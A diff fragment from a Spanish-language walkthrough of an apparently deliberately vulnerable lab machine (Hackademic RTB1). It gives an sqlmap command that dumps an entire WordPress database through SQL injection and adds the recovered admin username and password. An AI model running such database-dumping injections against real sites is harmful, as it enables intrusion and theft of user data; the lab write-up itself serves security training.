@@ -59,3 +59,8 @@ Extraer toda la información de la base de datos de WordPress:
 ```
 sqlmap --url 'http://192.168.1.5/Hackademic_RTB1/?cat=1' -D wordpress --dump-all --batch
 ```
+![6](https://user-images.githubusercontent.com/75953873/171922959-d02ba87f-22b8-4770-b0dc-9c74c82eee21.png)
+
+Usuario de WordPress: GeorgeMiller
+
+Contraseña: q1w2e3
